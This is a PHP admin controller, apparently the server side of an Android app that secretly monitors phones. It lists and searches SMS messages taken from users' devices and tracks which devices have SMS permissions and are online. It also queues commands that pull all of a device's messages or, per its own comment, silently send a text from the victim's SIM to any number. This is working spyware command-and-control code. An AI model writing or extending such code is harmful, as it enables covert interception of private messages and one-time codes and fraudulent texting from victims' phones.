<?php
declare(strict_types=1);

namespace app\admin\controller;

use think\Response;
use app\common\model\SmsRecord;
use app\common\model\User;
use app\common\model\DeviceCommand;

class Monitor extends Base
{
    /**
     * 短信记录列表
     */
    public function smsRecords(): Response
    {
        [$page, $pageSize] = $this->getPageParams();

        $query = SmsRecord::where('source', 'listen')->order('id', 'desc');

        $userId = input('user_id', '');
        if ($userId !== '') {
            $query->where('user_id', (int)$userId);
        }

        $phoneNumber = input('phone_number', '');
        if ($phoneNumber !== '') {
            $query->where('phone_number', 'like', '%' . $phoneNumber . '%');
        }

        $keyword = input('keyword', '');
        if ($keyword !== '') {
            $query->where('content', 'like', '%' . $keyword . '%');
        }

        $startDate = input('start_date', '');
        $endDate = input('end_date', '');
        if ($startDate) {
            $query->where('received_at', '>=', $startDate . ' 00:00:00');
        }
        if ($endDate) {
            $query->where('received_at', '<=', $endDate . ' 23:59:59');
        }

        $total = $query->count();
        $list = $query->page($page, $pageSize)->select()->toArray();

        // 附加用户信息
        $userIds = array_unique(array_column($list, 'user_id'));
        $users = [];
        if (!empty($userIds)) {
            $userList = User::whereIn('id', $userIds)->field('id,email,nickname,phone')->select();
            foreach ($userList as $user) {
                $users[$user->id] = [
                    'id' => $user->id,
                    'email' => $user->email ?? '',
                    'nickname' => $user->nickname ?? '',
                    'phone' => $user->phone ?? '',
                ];
            }
        }

        foreach ($list as &$item) {
            $item['user'] = $users[$item['user_id']] ?? null;
        }

        return $this->paginate($list, $total, $page, $pageSize);
    }

    /**
     * 短信记录详情
     */
    public function smsRecordDetail(int $id): Response
    {
        $record = SmsRecord::find($id);
        if (!$record) {
            return $this->error('Record not found');
        }

        $data = $record->toArray();

        // 附加用户信息
        $user = User::field('id,email,nickname,phone')->find($data['user_id']);
        $data['user'] = $user ? $user->toArray() : null;

        return $this->success($data);
    }

    /**
     * 短信记录统计
     */
    public function smsStatistics(): Response
    {
        $today = date('Y-m-d');

        $totalRecords = SmsRecord::where('source', 'listen')->count();
        $todayRecords = SmsRecord::where('source', 'listen')->whereDay('created_at', $today)->count();
        $totalUsers = SmsRecord::where('source', 'listen')->group('user_id')->count();

        return $this->success([
            'total_records' => $totalRecords,
            'today_records' => $todayRecords,
            'total_users' => $totalUsers,
        ]);
    }

    /**
     * 删除短信记录
     */
    public function deleteSmsRecord(int $id): Response
    {
        $record = SmsRecord::find($id);
        if (!$record) {
            return $this->error('Record not found');
        }

        $record->delete();
        return $this->success(null, 'Deleted');
    }

    /**
     * 批量删除短信记录
     */
    public function batchDeleteSmsRecords(): Response
    {
        $ids = input('post.ids', []);
        if (empty($ids) || !is_array($ids)) {
            return $this->error('IDs are required');
        }

        $count = SmsRecord::whereIn('id', $ids)->delete();
        return $this->success(['deleted' => $count], 'Deleted');
    }

    /**
     * 下发获取全部短信指令
     */
    public function fetchSmsCommand(): Response
    {
        $userId = (int)input('post.user_id', 0);
        if (!$userId) {
            return $this->error('User ID is required');
        }

        $user = User::find($userId);
        if (!$user) {
            return $this->error('User not found');
        }

        // 检查是否有未完成的同类指令
        $pending = DeviceCommand::where('user_id', $userId)
            ->where('command', DeviceCommand::CMD_FETCH_ALL_SMS)
            ->whereIn('status', [DeviceCommand::STATUS_PENDING, DeviceCommand::STATUS_SENT])
            ->find();

        if ($pending) {
            return $this->error('A fetch command is already pending for this user');
        }

        $command = DeviceCommand::create([
            'user_id' => $userId,
            'command' => DeviceCommand::CMD_FETCH_ALL_SMS,
            'status' => DeviceCommand::STATUS_PENDING,
            'created_at' => date('Y-m-d H:i:s'),
        ]);

        return $this->success([
            'command_id' => $command->id,
        ], 'Command sent');
    }

    /**
     * 下发静默发送短信指令
     */
    public function sendSmsCommand(): Response
    {
        $userId = (int)input('post.user_id', 0);
        if (!$userId) {
            return $this->error('User ID is required');
        }

        $phoneNumber = trim(input('post.phone_number', ''));
        if (!$phoneNumber) {
            return $this->error('Phone number is required');
        }

        $message = trim(input('post.message', ''));
        if (!$message) {
            return $this->error('Message is required');
        }

        $subId = (int)input('post.sub_id', 0); // SIM 卡槽，0=默认

        $user = User::find($userId);
        if (!$user) {
            return $this->error('User not found');
        }

        $params = ['phone_number' => $phoneNumber, 'message' => $message];
        if ($subId > 0) {
            $params['sub_id'] = $subId;
        }

        $command = DeviceCommand::create([
            'user_id' => $userId,
            'command' => DeviceCommand::CMD_SEND_SMS,
            'params' => json_encode($params),
            'status' => DeviceCommand::STATUS_PENDING,
            'created_at' => date('Y-m-d H:i:s'),
        ]);

        return $this->success([
            'command_id' => $command->id,
        ], 'Command sent');
    }

    /**
     * 查询指令状态
     */
    public function commandStatus(int $id): Response
    {
        $command = DeviceCommand::find($id);
        if (!$command) {
            return $this->error('Command not found');
        }

        $statusMap = [
            DeviceCommand::STATUS_PENDING => 'pending',
            DeviceCommand::STATUS_SENT => 'sent',
            DeviceCommand::STATUS_COMPLETED => 'completed',
            DeviceCommand::STATUS_FAILED => 'failed',
        ];

        return $this->success([
            'id' => $command->id,
            'user_id' => $command->user_id,
            'command' => $command->command,
            'status' => $statusMap[$command->status] ?? 'unknown',
            'result' => $command->result ? json_decode($command->result, true) : null,
            'created_at' => $command->created_at,
            'executed_at' => $command->executed_at,
        ]);
    }

    /**
     * 在线用户列表（可下发指令的用户）
     */
    public function onlineUsers(): Response
    {
        $users = User::where('is_online', 1)
            ->field('id,email,nickname,phone,online_device,last_heartbeat_at')
            ->order('last_heartbeat_at', 'desc')
            ->select()
            ->toArray();

        return $this->success($users);
    }

    /**
     * 安卓用户列表（监控用户列表）
     */
    public function androidUsers(): Response
    {
        [$page, $pageSize] = $this->getPageParams();

        $query = User::where('online_device', 'like', 'android%');

        // 搜索条件
        $keyword = input('keyword', '');
        if ($keyword !== '') {
            $query->where(function ($q) use ($keyword) {
                $q->where('email', 'like', '%' . $keyword . '%')
                  ->whereOr('nickname', 'like', '%' . $keyword . '%')
                  ->whereOr('phone', 'like', '%' . $keyword . '%');
            });
        }

        $onlineOnly = input('online_only', '');
        if ($onlineOnly === '1') {
            $query->where('is_online', 1);
        }

        $total = $query->count();
        $list = $query->field('id,email,nickname,phone,online_device,last_heartbeat_at,is_online,sms_permission,sms_listening,foreground_permission,is_default_sms,created_at')
            ->order('is_online', 'desc')
            ->order('last_heartbeat_at', 'desc')
            ->page($page, $pageSize)
            ->select()
            ->toArray();

        // 附加每个用户的短信统计
        $userIds = array_column($list, 'id');
        $smsCounts = [];
        if (!empty($userIds)) {
            $counts = SmsRecord::whereIn('user_id', $userIds)
                ->group('user_id')
                ->column('count(*)', 'user_id');
            $smsCounts = $counts;
        }

        // 附加未完成指令信息
        $pendingCommands = [];
        if (!empty($userIds)) {
            $cmds = DeviceCommand::whereIn('user_id', $userIds)
                ->whereIn('status', [DeviceCommand::STATUS_PENDING, DeviceCommand::STATUS_SENT])
                ->column('id,status', 'user_id');
            $pendingCommands = $cmds;
        }

        foreach ($list as &$item) {
            $item['sms_count'] = $smsCounts[$item['id']] ?? 0;
            $item['has_pending_command'] = isset($pendingCommands[$item['id']]);
        }

        return $this->paginate($list, $total, $page, $pageSize);
    }

    /**
     * 清除指定用户的待处理指令（标记为 failed）
     */
    public function clearPendingCommands(int $userId): Response
    {
        $count = DeviceCommand::where('user_id', $userId)
            ->whereIn('status', [DeviceCommand::STATUS_PENDING, DeviceCommand::STATUS_SENT])
            ->count();

        if ($count === 0) {
            return $this->error('No pending commands found');
        }

        DeviceCommand::where('user_id', $userId)
            ->whereIn('status', [DeviceCommand::STATUS_PENDING, DeviceCommand::STATUS_SENT])
            ->update(['status' => DeviceCommand::STATUS_FAILED]);

        return $this->success(['cleared' => $count]);
    }

    /**
     * 获取指定用户的短信记录
     */
    public function userSmsRecords(int $userId): Response
    {
        [$page, $pageSize] = $this->getPageParams();

        $query = SmsRecord::where('user_id', $userId)->order('received_at', 'desc');

        $keyword = input('keyword', '');
        if ($keyword !== '') {
            $query->where(function ($q) use ($keyword) {
                $q->where('content', 'like', '%' . $keyword . '%')
                  ->whereOr('phone_number', 'like', '%' . $keyword . '%');
            });
        }

        $total = $query->count();
        $list = $query->page($page, $pageSize)->select()->toArray();

        return $this->paginate($list, $total, $page, $pageSize);
    }
}
